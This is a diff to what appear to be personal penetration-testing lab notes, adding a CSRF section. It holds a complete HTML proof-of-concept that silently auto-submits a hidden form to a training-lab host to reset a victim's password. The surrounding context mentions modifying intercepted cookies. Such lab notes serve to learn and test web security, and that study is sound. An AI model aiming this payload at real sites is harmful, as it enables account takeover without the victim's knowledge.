@@ -76,3 +76,27 @@ with open('passwords.txt', 'r') as f:
 
 - Decode intercepted cookies and modify them. 
 
+## CSRF
+
+```html
+<html>
+ <head>
+ </head>
+ <body>
+ <!-- php ticket -->
+ <form
+action="http://erwb8pwcy6r2s2k63q756yur3.ap-south-16.attackdefensecloudlabs.com/?p=process_change_password&id=1"
+method="POST" id="csrf" name="csrf" onload="go()">
+ <input type="hidden" name="new_password" value="test"/>
+ <input type="hidden" name="confirm_password" value="test"/>
+ <input type="hidden" name="submit" value="Change Password"/>
+ <input type="submit" value="Submit form" />
+ </form>
+ </form>
+ <script language="JavaScript" type="text/javascript">
+ document.csrf.submit();
+ </script>
+ </body>
+ </html>
+```
+
